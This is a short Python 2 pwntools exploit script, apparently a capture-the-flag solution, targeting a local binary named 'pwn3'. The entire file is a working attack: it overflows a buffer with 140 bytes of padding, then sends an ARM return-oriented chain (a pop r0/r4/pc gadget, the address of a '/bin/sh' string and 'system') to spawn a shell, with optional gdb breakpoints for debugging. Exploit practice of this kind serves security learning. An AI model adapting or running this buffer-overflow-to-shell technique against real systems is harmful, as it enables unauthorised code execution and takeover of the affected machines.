#!/usr/bin/env python2
from pwn import *

exe = ELF("./pwn3")
context.binary = exe
context.terminal = "kitty -e sh -c".split()
context.log_level = "debug"

global io
breakpoints = '''
break *0x1035c
continue
'''
if len(sys.argv) > 1 and sys.argv[1] == "-ng":
    io = process(exe.path)
else:
    io = gdb.debug(exe.path, gdbscript=breakpoints)


def s(a): return io.send(a)
def sa(a, b): return io.sendafter(a, b)
def sl(a): return io.sendline(a)
def sla(a, b): return io.sendlineafter(a, b)
def re(a): return io.recv(a)
def reu(a): return io.recvuntil(a)
def rl(): return io.recvline(False)

system = 0x14b5c
binsh = 0x49018
pop_r0_r4_pc = 0x1fb5c

reu("buffer: ")

payload = flat([
    "A"*140,
    pop_r0_r4_pc, binsh, 0xdeadbeef, system+1
    ])

sl(payload)

io.interactive()